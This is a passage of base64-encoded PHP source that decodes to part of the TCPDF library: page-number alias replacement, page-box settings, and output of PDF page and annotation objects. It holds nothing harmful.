hZ2UgYWxpYXNlcy4KCSAqIEByZXR1cm4gYXJyYXkgb2YgcGFnZSBudW1iZXIgYWxpYXNlcwoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gZ2V0QWxsSW50ZXJuYWxQYWdlTnVtYmVyQWxpYXNlcygpIHsKCQkkYmFzaWNfYWxpYXMgPSBhcnJheShUQ1BERl9TVEFUSUM6OiRhbGlhc190b3RfcGFnZXMsIFRDUERGX1NUQVRJQzo6JGFsaWFzX251bV9wYWdlLCBUQ1BERl9TVEFUSUM6OiRhbGlhc19ncm91cF90b3RfcGFnZXMsIFRDUERGX1NUQVRJQzo6JGFsaWFzX2dyb3VwX251bV9wYWdlLCBUQ1BERl9TVEFUSUM6OiRhbGlhc19yaWdodF9zaGlmdCk7CgkJJHBuYWxpYXMgPSBhcnJheSgpOwoJCWZvcmVhY2goJGJhc2ljX2FsaWFzIGFzICRrID0+ICRhKSB7CgkJCSRwbmFsaWFzWyRrXSA9ICR0aGlzLT5nZXRJbnRlcm5hbFBhZ2VOdW1iZXJBbGlhc2VzKCRhKTsKCQl9CgkJcmV0dXJuICRwbmFsaWFzOwoJfQoKCS8qKgoJICogUmVwbGFjZSByaWdodCBzaGlmdCBwYWdlIG51bWJlciBhbGlhc2VzIHdpdGggc3BhY2VzIHRvIGNvcnJlY3QgcmlnaHQgYWxpZ25tZW50LgoJICogVGhpcyB3b3JrcyBwZXJmZWN0bHkgb25seSB3aGVuIHVzaW5nIG1vbm9zcGFjZWQgZm9udHMuCgkgKiBAcGFyYW0gc3RyaW5nICRwYWdlIFBhZ2UgY29udGVudC4KCSAqIEBwYXJhbSBhcnJheSAkYWxpYXNlcyBBcnJheSBvZiBwYWdlIGFsaWFzZXMuCgkgKiBAcGFyYW0gaW50ICRkaWZmIGluaXRpYWwgZGlmZmVyZW5jZSB0byBhZGQuCgkgKiBAcmV0dXJuIHN0cmluZyByZXBsYWNlZCBwYWdlIGNvbnRlbnQuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiByZXBsYWNlUmlnaHRTaGlmdFBhZ2VOdW1BbGlhc2VzKCRwYWdlLCAkYWxpYXNlcywgJGRpZmYpIHsKCQlmb3JlYWNoICgkYWxpYXNlcyBhcyAkdHlwZSA9PiAkYWxpYXMpIHsKCQkJZm9yZWFjaCAoJGFsaWFzIGFzICRhKSB7CgkJCQkvLyBmaW5kIHBvc2l0aW9uIG9mIGNvbXBlbnNhdGlvbiBmYWN0b3IKCQkJCSRzdGFydG51bSA9IChzdHJwb3MoJGEsICc6JykgKyAxKTsKCQkJCSRhID0gc3Vic3RyKCRhLCAwLCAkc3RhcnRudW0pOwoJCQkJaWYgKCgkcG9zID0gc3RycG9zKCRwYWdlLCAkYSkpICE9PSBmYWxzZSkgewoJCQkJCS8vIGVuZCBvZiBhbGlhcwoJCQkJCSRlbmRudW0gPSBzdHJwb3MoJHBhZ2UsICd9JywgJHBvcyk7CgkJCQkJLy8gc3RyaW5nIHRvIGJlIHJlcGxhY2VkCgkJCQkJJGFhID0gc3Vic3RyKCRwYWdlLCAkcG9zLCAoJGVuZG51bSAtICRwb3MgKyAxKSk7CgkJCQkJLy8gZ2V0IGNvbXBlbnNhdGlvbiBmYWN0b3IKCQkJCQkkcmF0aW8gPSBzdWJzdHIoJHBhZ2UsICgkcG9zICsgJHN0YXJ0bnVtKSwgKCRlbmRudW0gLSAkcG9zIC0gJHN0YXJ0bnVtKSk7CgkJCQkJJHJhdGlvID0gcHJlZ19yZXBsYWNlKCcvW14wLTlcLl0vJywgJycsICRyYXRpbyk7CgkJCQkJJHJhdGlvID0gZmxvYXR2YWwoJHJhdGlvKTsKCQkJCQlpZiAoJHR5cGUgPT0gJ3UnKSB7CgkJCQkJCSRjaHJkaWZmID0gZmxvb3IoKCRkaWZmICsgMTIpICogJHJhdGlvKTsKCQkJCQkJJHNoaWZ0ID0gc3RyX3JlcGVhdCgnICcsICRjaHJkaWZmKTsKCQkJCQkJJHNoaWZ0ID0gVENQREZfRk9OVFM6OlVURjhUb1VURjE2QkUoJHNoaWZ0LCBmYWxzZSwgJHRoaXMtPmlzdW5pY29kZSwgJHRoaXMtPkN1cnJlbnRGb250KTsKCQkJCQl9IGVsc2UgewoJCQkJCQkkY2hyZGlmZiA9IGZsb29yKCgkZGlmZiArIDExKSAqICRyYXRpbyk7CgkJCQkJCSRzaGlmdCA9IHN0cl9yZXBlYXQoJyAnLCAkY2hyZGlmZik7CgkJCQkJfQoJCQkJCSRwYWdlID0gc3RyX3JlcGxhY2UoJGFhLCAkc2hpZnQsICRwYWdlKTsKCQkJCX0KCQkJfQoJCX0KCQlyZXR1cm4gJHBhZ2U7Cgl9CgoJLyoqCgkgKiBTZXQgcGFnZSBib3hlcyB0byBiZSBpbmNsdWRlZCBvbiBwYWdlIGRlc2NyaXB0aW9ucy4KCSAqIEBwYXJhbSBhcnJheSAkYm94ZXMgQXJyYXkgb2YgcGFnZSBib3hlcyB0byBzZXQgb24gZG9jdW1lbnQ6ICgnTWVkaWFCb3gnLCAnQ3JvcEJveCcsICdCbGVlZEJveCcsICdUcmltQm94JywgJ0FydEJveCcpLgoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gc2V0UGFnZUJveFR5cGVzKCRib3hlcykgewoJCSR0aGlzLT5wYWdlX2JveGVzID0gYXJyYXkoKTsKCQlmb3JlYWNoICgkYm94ZXMgYXMgJGJveCkgewoJCQlpZiAoaW5fYXJyYXkoJGJveCwgVENQREZfU1RBVElDOjokcGFnZWJveGVzKSkgewoJCQkJJHRoaXMtPnBhZ2VfYm94ZXNbXSA9ICRib3g7CgkJCX0KCQl9Cgl9CgoJLyoqCgkgKiBPdXRwdXQgcGFnZXMgKGFuZCByZXBsYWNlIHBhZ2UgbnVtYmVyIGFsaWFzZXMpLgoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gX3B1dHBhZ2VzKCkgewoJCSRmaWx0ZXIgPSAoJHRoaXMtPmNvbXByZXNzKSA/ICcvRmlsdGVyIC9GbGF0ZURlY29kZSAnIDogJyc7CgkJLy8gZ2V0IGludGVybmFsIGFsaWFzZXMgZm9yIHBhZ2UgbnVtYmVycwoJCSRwbmFsaWFzID0gJHRoaXMtPmdldEFsbEludGVybmFsUGFnZU51bWJlckFsaWFzZXMoKTsKCQkkbnVtX3BhZ2VzID0gJHRoaXMtPm51bXBhZ2VzOwoJCSRwdHBhID0gVENQREZfU1RBVElDOjpmb3JtYXRQYWdlTnVtYmVyKCgkdGhpcy0+c3RhcnRpbmdfcGFnZV9udW1iZXIgKyAkbnVtX3BhZ2VzIC0gMSkpOwoJCSRwdHB1ID0gVENQREZfRk9OVFM6OlVURjhUb1VURjE2QkUoJHB0cGEsIGZhbHNlLCAkdGhpcy0+aXN1bmljb2RlLCAkdGhpcy0+Q3VycmVudEZvbnQpOwoJCSRwdHBfbnVtX2NoYXJzID0gJHRoaXMtPkdldE51bUNoYXJzKCRwdHBhKTsKCQkkcGFnZWdyb3VwbnVtID0gMDsKCQkkZ3JvdXBudW0gPSAwOwoJCSRwdGd1ID0gMTsKCQkkcHRnYSA9IDE7CgkJJHB0Z19udW1fY2hhcnMgPSAxOwoJCWZvciAoJG4gPSAxOyAkbiA8PSAkbnVtX3BhZ2VzOyArKyRuKSB7CgkJCS8vIGdldCBjdXJyZW50IHBhZ2UKCQkJJHRlbXBwYWdlID0gJHRoaXMtPmdldFBhZ2VCdWZmZXIoJG4pOwoJCQkkcGFnZWxlbiA9IHN0cmxlbigkdGVtcHBhZ2UpOwoJCQkvLyBzZXQgcmVwbGFjZW1lbnRzIGZvciB0b3RhbCBwYWdlcyBudW1iZXIKCQkJJHBucGEgPSBUQ1BERl9TVEFUSUM6OmZvcm1hdFBhZ2VOdW1iZXIoKCR0aGlzLT5zdGFydGluZ19wYWdlX251bWJlciArICRuIC0gMSkpOwoJCQkkcG5wdSA9IFRDUERGX0ZPTlRTOjpVVEY4VG9VVEYxNkJFKCRwbnBhLCBmYWxzZSwgJHRoaXMtPmlzdW5pY29kZSwgJHRoaXMtPkN1cnJlbnRGb250KTsKCQkJJHBucF9udW1fY2hhcnMgPSAkdGhpcy0+R2V0TnVtQ2hhcnMoJHBucGEpOwoJCQkkcGRpZmYgPSAwOyAvLyBkaWZmZXJlbmNlIHVzZWQgZm9yIHJpZ2h0IHNoaWZ0IGFsaWdubWVudCBvZiBwYWdlIG51bWJlcnMKCQkJJGdkaWZmID0gMDsgLy8gZGlmZmVyZW5jZSB1c2VkIGZvciByaWdodCBzaGlmdCBhbGlnbm1lbnQgb2YgcGFnZSBncm91cCBudW1iZXJzCgkJCWlmICghZW1wdHkoJHRoaXMtPnBhZ2Vncm91cHMpKSB7CgkJCQlpZiAoaXNzZXQoJHRoaXMtPm5ld3BhZ2Vncm91cFskbl0pKSB7CgkJCQkJJHBhZ2Vncm91cG51bSA9IDA7CgkJCQkJKyskZ3JvdXBudW07CgkJCQkJJHB0Z2EgPSBUQ1BERl9TVEFUSUM6OmZvcm1hdFBhZ2VOdW1iZXIoJHRoaXMtPnBhZ2Vncm91cHNbJGdyb3VwbnVtXSk7CgkJCQkJJHB0Z3UgPSBUQ1BERl9GT05UUzo6VVRGOFRvVVRGMTZCRSgkcHRnYSwgZmFsc2UsICR0aGlzLT5pc3VuaWNvZGUsICR0aGlzLT5DdXJyZW50Rm9udCk7CgkJCQkJJHB0Z19udW1fY2hhcnMgPSAkdGhpcy0+R2V0TnVtQ2hhcnMoJHB0Z2EpOwoJCQkJfQoJCQkJKyskcGFnZWdyb3VwbnVtOwoJCQkJJHBuZ2EgPSBUQ1BERl9TVEFUSUM6OmZvcm1hdFBhZ2VOdW1iZXIoJHBhZ2Vncm91cG51bSk7CgkJCQkkcG5ndSA9IFRDUERGX0ZPTlRTOjpVVEY4VG9VVEYxNkJFKCRwbmdhLCBmYWxzZSwgJHRoaXMtPmlzdW5pY29kZSwgJHRoaXMtPkN1cnJlbnRGb250KTsKCQkJCSRwbmdfbnVtX2NoYXJzID0gJHRoaXMtPkdldE51bUNoYXJzKCRwbmdhKTsKCQkJCS8vIHJlcGxhY2UgcGFnZSBudW1iZXJzCgkJCQkkcmVwbGFjZSA9IGFycmF5KCk7CgkJCQkkcmVwbGFjZVtdID0gYXJyYXkoJHB0Z3UsICRwdGdfbnVtX2NoYXJzLCA5LCAkcG5hbGlhc1syXVsndSddKTsKCQkJCSRyZXBsYWNlW10gPSBhcnJheSgkcHRnYSwgJHB0Z19udW1fY2hhcnMsIDcsICRwbmFsaWFzWzJdWydhJ10pOwoJCQkJJHJlcGxhY2VbXSA9IGFycmF5KCRwbmd1LCAkcG5nX251bV9jaGFycywgOSwgJHBuYWxpYXNbM11bJ3UnXSk7CgkJCQkkcmVwbGFjZVtdID0gYXJyYXkoJHBuZ2EsICRwbmdfbnVtX2NoYXJzLCA3LCAkcG5hbGlhc1szXVsnYSddKTsKCQkJCWxpc3QoJHRlbXBwYWdlLCAkZ2RpZmYpID0gVENQREZfU1RBVElDOjpyZXBsYWNlUGFnZU51bUFsaWFzZXMoJHRlbXBwYWdlLCAkcmVwbGFjZSwgJGdkaWZmKTsKCQkJfQoJCQkvLyByZXBsYWNlIHBhZ2UgbnVtYmVycwoJCQkkcmVwbGFjZSA9IGFycmF5KCk7CgkJCSRyZXBsYWNlW10gPSBhcnJheSgkcHRwdSwgJHB0cF9udW1fY2hhcnMsIDksICRwbmFsaWFzWzBdWyd1J10pOwoJCQkkcmVwbGFjZVtdID0gYXJyYXkoJHB0cGEsICRwdHBfbnVtX2NoYXJzLCA3LCAkcG5hbGlhc1swXVsnYSddKTsKCQkJJHJlcGxhY2VbXSA9IGFycmF5KCRwbnB1LCAkcG5wX251bV9jaGFycywgOSwgJHBuYWxpYXNbMV1bJ3UnXSk7CgkJCSRyZXBsYWNlW10gPSBhcnJheSgkcG5wYSwgJHBucF9udW1fY2hhcnMsIDcsICRwbmFsaWFzWzFdWydhJ10pOwoJCQlsaXN0KCR0ZW1wcGFnZSwgJHBkaWZmKSA9IFRDUERGX1NUQVRJQzo6cmVwbGFjZVBhZ2VOdW1BbGlhc2VzKCR0ZW1wcGFnZSwgJHJlcGxhY2UsICRwZGlmZik7CgkJCS8vIHJlcGxhY2UgcmlnaHQgc2hpZnQgYWxpYXMKCQkJJHRlbXBwYWdlID0gJHRoaXMtPnJlcGxhY2VSaWdodFNoaWZ0UGFnZU51bUFsaWFzZXMoJHRlbXBwYWdlLCAkcG5hbGlhc1s0XSwgbWF4KCRwZGlmZiwgJGdkaWZmKSk7CgkJCS8vIHJlcGxhY2UgRVBTIG1hcmtlcgoJCQkkdGVtcHBhZ2UgPSBzdHJfcmVwbGFjZSgkdGhpcy0+ZXBzbWFya2VyLCAnJywgJHRlbXBwYWdlKTsKCQkJLy9QYWdlCgkJCSR0aGlzLT5wYWdlX29ial9pZFskbl0gPSAkdGhpcy0+X25ld29iaigpOwoJCQkkb3V0ID0gJzw8JzsKCQkJJG91dCAuPSAnIC9UeXBlIC9QYWdlJzsKCQkJJG91dCAuPSAnIC9QYXJlbnQgMSAwIFInOwoJCQlpZiAoZW1wdHkoJHRoaXMtPnNpZ25hdHVyZV9kYXRhWydhcHByb3ZhbCddKSBPUiAoJHRoaXMtPnNpZ25hdHVyZV9kYXRhWydhcHByb3ZhbCddICE9ICdBJykpIHsKCQkJCSRvdXQgLj0gJyAvTGFzdE1vZGlmaWVkICcuJHRoaXMtPl9kYXRlc3RyaW5nKDAsICR0aGlzLT5kb2NfbW9kaWZpY2F0aW9uX3RpbWVzdGFtcCk7CgkJCX0KCQkJJG91dCAuPSAnIC9SZXNvdXJjZXMgMiAwIFInOwoJCQlmb3JlYWNoICgkdGhpcy0+cGFnZV9ib3hlcyBhcyAkYm94KSB7CgkJCQkkb3V0IC49ICcgLycuJGJveDsKCQkJCSRvdXQgLj0gc3ByaW50ZignIFslRiAlRiAlRiAlRl0nLCAkdGhpcy0+cGFnZWRpbVskbl1bJGJveF1bJ2xseCddLCAkdGhpcy0+cGFnZWRpbVskbl1bJGJveF1bJ2xseSddLCAkdGhpcy0+cGFnZWRpbVskbl1bJGJveF1bJ3VyeCddLCAkdGhpcy0+cGFnZWRpbVskbl1bJGJveF1bJ3VyeSddKTsKCQkJfQoJCQlpZiAoaXNzZXQoJHRoaXMtPnBhZ2VkaW1bJG5dWydCb3hDb2xvckluZm8nXSkgQU5EICFlbXB0eSgkdGhpcy0+cGFnZWRpbVskbl1bJ0JveENvbG9ySW5mbyddKSkgewoJCQkJJG91dCAuPSAnIC9Cb3hDb2xvckluZm8gPDwnOwoJCQkJZm9yZWFjaCAoJHRoaXMtPnBhZ2VfYm94ZXMgYXMgJGJveCkgewoJCQkJCWlmIChpc3NldCgkdGhpcy0+cGFnZWRpbVskbl1bJ0JveENvbG9ySW5mbyddWyRib3hdKSkgewoJCQkJCQkkb3V0IC49ICcgLycuJGJveC4nIDw8JzsKCQkJCQkJaWYgKGlzc2V0KCR0aGlzLT5wYWdlZGltWyRuXVsnQm94Q29sb3JJbmZvJ11bJGJveF1bJ0MnXSkpIHsKCQkJCQkJCSRjb2xvciA9ICR0aGlzLT5wYWdlZGltWyRuXVsnQm94Q29sb3JJbmZvJ11bJGJveF1bJ0MnXTsKCQkJCQkJCSRvdXQgLj0gJyAvQyBbJzsKCQkJCQkJCSRvdXQgLj0gc3ByaW50ZignICVGICVGICVGJywgKCRjb2xvclswXSAvIDI1NSksICgkY29sb3JbMV0gLyAyNTUpLCAoJGNvbG9yWzJdIC8gMjU1KSk7CgkJCQkJCQkkb3V0IC49ICcgXSc7CgkJCQkJCX0KCQkJCQkJaWYgKGlzc2V0KCR0aGlzLT5wYWdlZGltWyRuXVsnQm94Q29sb3JJbmZvJ11bJGJveF1bJ1cnXSkpIHsKCQkJCQkJCSRvdXQgLj0gJyAvVyAnLigkdGhpcy0+cGFnZWRpbVskbl1bJ0JveENvbG9ySW5mbyddWyRib3hdWydXJ10gKiAkdGhpcy0+ayk7CgkJCQkJCX0KCQkJCQkJaWYgKGlzc2V0KCR0aGlzLT5wYWdlZGltWyRuXVsnQm94Q29sb3JJbmZvJ11bJGJveF1bJ1MnXSkpIHsKCQkJCQkJCSRvdXQgLj0gJyAvUyAvJy4kdGhpcy0+cGFnZWRpbVskbl1bJ0JveENvbG9ySW5mbyddWyRib3hdWydTJ107CgkJCQkJCX0KCQkJCQkJaWYgKGlzc2V0KCR0aGlzLT5wYWdlZGltWyRuXVsnQm94Q29sb3JJbmZvJ11bJGJveF1bJ0QnXSkpIHsKCQkJCQkJCSRkYXNoZXMgPSAkdGhpcy0+cGFnZWRpbVskbl1bJ0JveENvbG9ySW5mbyddWyRib3hdWydEJ107CgkJCQkJCQkkb3V0IC49ICcgL0QgWyc7CgkJCQkJCQlmb3JlYWNoICgkZGFzaGVzIGFzICRkYXNoKSB7CgkJCQkJCQkJJG91dCAuPSBzcHJpbnRmKCcgJUYnLCAoJGRhc2ggKiAkdGhpcy0+aykpOwoJCQkJCQkJfQoJCQkJCQkJJG91dCAuPSAnIF0nOwoJCQkJCQl9CgkJCQkJCSRvdXQgLj0gJyA+Pic7CgkJCQkJfQoJCQkJfQoJCQkJJG91dCAuPSAnID4+JzsKCQkJfQoJCQkkb3V0IC49ICcgL0NvbnRlbnRzICcuKCR0aGlzLT5uICsgMSkuJyAwIFInOwoJCQkkb3V0IC49ICcgL1JvdGF0ZSAnLiR0aGlzLT5wYWdlZGltWyRuXVsnUm90YXRlJ107CgkJCWlmICghJHRoaXMtPnBkZmFfbW9kZSB8fCAkdGhpcy0+cGRmYV92ZXJzaW9uID49IDIpIHsKCQkJCSRvdXQgLj0gJyAvR3JvdXAgPDwgL1R5cGUgL0dyb3VwIC9TIC9UcmFuc3BhcmVuY3kgL0NTIC9EZXZpY2VSR0IgPj4nOwoJCQl9CgkJCWlmIChpc3NldCgkdGhpcy0+cGFnZWRpbVskbl1bJ3RyYW5zJ10pIEFORCAhZW1wdHkoJHRoaXMtPnBhZ2VkaW1bJG5dWyd0cmFucyddKSkgewoJCQkJLy8gcGFnZSB0cmFuc2l0aW9ucwoJCQkJaWYgKGlzc2V0KCR0aGlzLT5wYWdlZGltWyRuXVsndHJhbnMnXVsnRHVyJ10pKSB7CgkJCQkJJG91dCAuPSAnIC9EdXIgJy4kdGhpcy0+cGFnZWRpbVskbl1bJ3RyYW5zJ11bJ0R1ciddOwoJCQkJfQoJCQkJJG91dCAuPSAnIC9UcmFucyA8PCc7CgkJCQkkb3V0IC49ICcgL1R5cGUgL1RyYW5zJzsKCQkJCWlmIChpc3NldCgkdGhpcy0+cGFnZWRpbVskbl1bJ3RyYW5zJ11bJ1MnXSkpIHsKCQkJCQkkb3V0IC49ICcgL1MgLycuJHRoaXMtPnBhZ2VkaW1bJG5dWyd0cmFucyddWydTJ107CgkJCQl9CgkJCQlpZiAoaXNzZXQoJHRoaXMtPnBhZ2VkaW1bJG5dWyd0cmFucyddWydEJ10pKSB7CgkJCQkJJG91dCAuPSAnIC9EICcuJHRoaXMtPnBhZ2VkaW1bJG5dWyd0cmFucyddWydEJ107CgkJCQl9CgkJCQlpZiAoaXNzZXQoJHRoaXMtPnBhZ2VkaW1bJG5dWyd0cmFucyddWydEbSddKSkgewoJCQkJCSRvdXQgLj0gJyAvRG0gLycuJHRoaXMtPnBhZ2VkaW1bJG5dWyd0cmFucyddWydEbSddOwoJCQkJfQoJCQkJaWYgKGlzc2V0KCR0aGlzLT5wYWdlZGltWyRuXVsndHJhbnMnXVsnTSddKSkgewoJCQkJCSRvdXQgLj0gJyAvTSAvJy4kdGhpcy0+cGFnZWRpbVskbl1bJ3RyYW5zJ11bJ00nXTsKCQkJCX0KCQkJCWlmIChpc3NldCgkdGhpcy0+cGFnZWRpbVskbl1bJ3RyYW5zJ11bJ0RpJ10pKSB7CgkJCQkJJG91dCAuPSAnIC9EaSAnLiR0aGlzLT5wYWdlZGltWyRuXVsndHJhbnMnXVsnRGknXTsKCQkJCX0KCQkJCWlmIChpc3NldCgkdGhpcy0+cGFnZWRpbVskbl1bJ3RyYW5zJ11bJ1NTJ10pKSB7CgkJCQkJJG91dCAuPSAnIC9TUyAnLiR0aGlzLT5wYWdlZGltWyRuXVsndHJhbnMnXVsnU1MnXTsKCQkJCX0KCQkJCWlmIChpc3NldCgkdGhpcy0+cGFnZWRpbVskbl1bJ3RyYW5zJ11bJ0InXSkpIHsKCQkJCQkkb3V0IC49ICcgL0IgJy4kdGhpcy0+cGFnZWRpbVskbl1bJ3RyYW5zJ11bJ0InXTsKCQkJCX0KCQkJCSRvdXQgLj0gJyA+Pic7CgkJCX0KCQkJJG91dCAuPSAkdGhpcy0+X2dldGFubm90c3JlZnMoJG4pOwoJCQkkb3V0IC49ICcgL1BaICcuJHRoaXMtPnBhZ2VkaW1bJG5dWydQWiddOwoJCQkkb3V0IC49ICcgPj4nOwoJCQkkb3V0IC49ICJcbiIuJ2VuZG9iaic7CgkJCSR0aGlzLT5fb3V0KCRvdXQpOwoJCQkvL1BhZ2UgY29udGVudAoJCQkkcCA9ICgkdGhpcy0+Y29tcHJlc3MpID8gZ3pjb21wcmVzcygkdGVtcHBhZ2UpIDogJHRlbXBwYWdlOwoJCQkkdGhpcy0+X25ld29iaigpOwoJCQkkcCA9ICR0aGlzLT5fZ2V0cmF3c3RyZWFtKCRwKTsKCQkJJHRoaXMtPl9vdXQoJzw8Jy4kZmlsdGVyLicvTGVuZ3RoICcuc3RybGVuKCRwKS4nPj4gc3RyZWFtJy4iXG4iLiRwLiJcbiIuJ2VuZHN0cmVhbScuIlxuIi4nZW5kb2JqJyk7CgkJfQoJCS8vUGFnZXMgcm9vdAoJCSRvdXQgPSAkdGhpcy0+X2dldG9iaigxKS4iXG4iOwoJCSRvdXQgLj0gJzw8IC9UeXBlIC9QYWdlcyAvS2lkcyBbJzsKCQlmb3JlYWNoKCR0aGlzLT5wYWdlX29ial9pZCBhcyAkcGFnZV9vYmopIHsKCQkJJG91dCAuPSAnICcuJHBhZ2Vfb2JqLicgMCBSJzsKCQl9CgkJJG91dCAuPSAnIF0gL0NvdW50ICcuJG51bV9wYWdlcy4nID4+JzsKCQkkb3V0IC49ICJcbiIuJ2VuZG9iaic7CgkJJHRoaXMtPl9vdXQoJG91dCk7Cgl9CgoJLyoqCgkgKiBHZXQgcmVmZXJlbmNlcyB0byBwYWdlIGFubm90YXRpb25zLgoJICogQHBhcmFtIGludCAkbiBwYWdlIG51bWJlcgoJICogQHJldHVybiBzdHJpbmcKCSAqIEBwcm90ZWN0ZWQKCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAc2luY2UgNS4wLjAxMCAoMjAxMC0wNS0xNykKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIF9nZXRhbm5vdHNyZWZzKCRuKSB7CgkJaWYgKCEoaXNzZXQoJHRoaXMtPlBhZ2VBbm5vdHNbJG5dKSBPUiBjb3VudCgkdGhpcy0+ZW1wdHlfc2lnbmF0dXJlX2FwcGVhcmFuY2UpPjAgT1IgKCR0aGlzLT5zaWduIEFORCBpc3NldCgkdGhpcy0+c2lnbmF0dXJlX2RhdGFbJ2NlcnRfdHlwZSddKSkpKSB7CgkJCXJldHVybiAnJzsKCQl9CgkJJG91dCA9ICcgL0Fubm90cyBbJzsKCQlpZiAoaXNzZXQoJHRoaXMtPlBhZ2VBbm5vdHNbJG5dKSkgewoJCQlmb3JlYWNoICgkdGhpcy0+UGFnZUFubm90c1skbl0gYXMgJGtleSA9PiAkdmFsKSB7CgkJCQlpZiAoIWluX2FycmF5KCR2YWxbJ24nXSwgJHRoaXMtPnJhZGlvX2dyb3VwcykpIHsKCQkJCQkkb3V0IC49ICcgJy4kdmFsWyduJ10uJyAwIFInOwoJCQkJfQoJCQl9CgkJCS8vIGFkZCByYWRpb2J1dHRvbiBncm91cHMKCQkJaWYgKGlzc2V0KCR0aGlzLT5yYWRpb2J1dHRvbl9ncm91cHNbJG5dKSkgewoJCQkJZm9yZWFjaCAoJHRoaXMtPnJhZGlvYnV0dG9uX2dyb3Vwc1skbl0gYXMgJGtleSA9PiAkZGF0YSkgewoJCQkJCWlmIChpc3NldCgkZGF0YVsnbiddKSkgewoJCQkJCQkkb3V0IC49ICcgJy4kZGF0YVsnbiddLicgMCBSJzsKCQkJCQl9CgkJCQl9CgkJCX0KCQl9CgkJaWYgKCR0aGlzLT5zaWduIEFORCAoJG4gPT0gJHRoaXMtPnNpZ25hdHVyZV9hcHBlYXJhbmNlWydwYWdlJ10pIEFORCBpc3NldCgkdGhpcy0+c2lnbmF0dXJlX2RhdGFbJ2NlcnRfdHlwZSddKSkgewoJCQkvLyBzZXQgcmVmZXJlbmNlIGZvciBzaWduYXR1cmUgb2JqZWN0CgkJCSRvdXQgLj0gJyAnLiR0aGlzLT5zaWdfb2JqX2lkLicgMCBSJzsKCQl9CgkJaWYgKCFlbXB0eSgkdGhpcy0+ZW1wdHlfc2lnbmF0dXJlX2FwcGVhcmFuY2UpKSB7CgkJCWZvcmVhY2ggKCR0aGlzLT5lbXB0eV9zaWduYXR1cmVfYXBwZWFyYW5jZSBhcyAkZXNhKSB7CgkJCQlpZiAoJGVzYVsncGFnZSddID09ICRuKSB7CgkJCQkJLy8gc2V0IHJlZmVyZW5jZSBmb3IgZW1wdHkgc2lnbmF0dXJlIG9iamVjdHMKCQkJCQkkb3V0IC49ICcgJy4kZXNhWydvYmppZCddLicgMCBSJzsKCQkJCX0KCQkJfQoJCX0KCQkkb3V0IC49ICcgXSc7CgkJcmV0dXJuICRvdXQ7Cgl9CgoJLyoqCgkgKiBPdXRwdXQgYW5ub3RhdGlvbnMgb2JqZWN0cyBmb3IgYWxsIHBhZ2VzLgoJICogISEhIFRISVMgTUVUSE9EIElTIE5PVCBZRVQgQ09NUExFVEVEICEhIQoJICogU2VlIHNlY3Rpb24gMTIuNSBvZiBQREYgMzIwMDBfMjAwOCByZWZlcmVuY2UuCgkgKiBAcHJvdGVjdGVkCgkgKiBAYXV0aG9yIE5pY29sYSBBc3VuaQoJICogQHNpbmNlIDQuMC4wMTggKDIwMDgtMDgtMDYpCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBfcHV0YW5ub3Rzb2JqcygpIHsKCQkvLyByZXNldCBvYmplY3QgY291bnRlcgoJCWZvciAoJG49MTsgJG4gPD0gJHRoaXMtPm51bXBhZ2VzOyArKyRuKSB7CgkJCWlmIChpc3NldCgkdGhpcy0+UGFnZUFubm90c1skbl0pKSB7CgkJCQkvLyBzZXQgcGFnZSBhbm5vdGF0aW9ucwoJCQkJZm9yZWFjaCAoJHRoaXMtPlBhZ2VBbm5vdHNbJG5dIGFzICRrZXkgPT4gJHBsKSB7CgkJCQkJJGFubm90X29ial9pZCA9ICR0aGlzLT5QYWdlQW5ub3RzWyRuXVska2V5XVsnbiddOwoJCQkJCS8vIGNyZWF0ZSBhbm5vdGF0aW9uIG9iamVjdCBmb3IgZ3JvdXBpbmcgcmFkaW9idXR0b25zCgkJCQkJaWYgKGlzc2V0KCR0aGlzLT5yYWRpb2J1dHRvbl9ncm91cHNbJG5dWyRwbFsndHh0J11dKSBBTkQgaXNfYXJyYXkoJHRoaXMtPnJhZGlvYnV0dG9uX2dyb3Vwc1skbl1bJHBsWyd0eHQnXV0pKSB7CgkJCQkJCSRyYWRpb19idXR0b25fb2JqX2lkID0gJHRoaXMtPnJhZGlvYnV0dG9uX2dyb3Vwc1skbl1bJHBsWyd0eHQnXV1bJ24nXTsKCQkJCQkJJGFubm90cyA9ICc8PCc7CgkJCQkJCSRhbm5vdHMgLj0gJyAvVHlwZSAvQW5ub3QnOwoJCQkJCQkkYW5ub3RzIC49ICcgL1N1YnR5cGUgL1dpZGdldCc7CgkJCQkJCSRhbm5vdHMgLj0gJyAvUmVjdCBbMCAwIDAgMF0nOwoJCQkJCQlpZiAoJHRoaXMtPnJhZGlvYnV0dG9uX2dyb3Vwc1skbl1bJHBsWyd0eHQnXV1bJyNyZWFkb25seSMnXSkgewoJCQkJCQkJLy8gcmVhZCBvbmx5CgkJCQkJCQkkYW5ub3RzIC49ICcgL0YgNjgnOwoJCQkJCQkJJGFubm90cyAuPSAnIC9GZiA0OTE1Myc7CgkJCQkJCX0gZWxzZSB7CgkJCQkJCQkkYW5ub3RzIC49ICcgL0YgNCc7IC8vIGRlZmF1bHQgcHJpbnQgZm9yIFBERi9BCgkJCQkJCQkkYW5ub3RzIC49ICcgL0ZmIDQ5MTUyJzsKCQkJCQkJfQoJCQkJCQkkYW5ub3RzIC49ICcgL1QgJy4kdGhpcy0+X2RhdGFzdHJpbmcoJHBsWyd0eHQnXSwgJHJhZGlvX2J1dHRvbl9vYmpfaWQpOwoJCQkJCQlpZiAoaXNzZXQoJHBsWydvcHQnXVsndHUnXSkgQU5EIGlzX3N0cmluZygkcGxbJ29wdCddWyd0dSddKSkgewoJCQkJCQkJJGFubm90cyAuPSAnIC9UVSAnLiR0aGlzLT5fZGF0YXN0cmluZygkcGxbJ29wdCddWyd0dSddLCAkcmFkaW9fYnV0dG9uX29ial9pZCk7CgkJCQkJCX0KCQkJCQkJJGFubm90cyAuPSAnIC9GVCAvQnRuJzsKCQkJCQkJJGFubm90cyAuPSAnIC9LaWRzIFsnOwoJCQkJCQkkZGVmdmFsID0gJyc7CgkJCQkJCWZvcmVhY2ggKCR0aGlzLT5yYWRpb2J1dHRvbl9ncm91cHNbJG5dWyRwbFsndHh0J11dIGFzICRrZXkgPT4gJGRhdGEpIHsKCQkJCQkJCW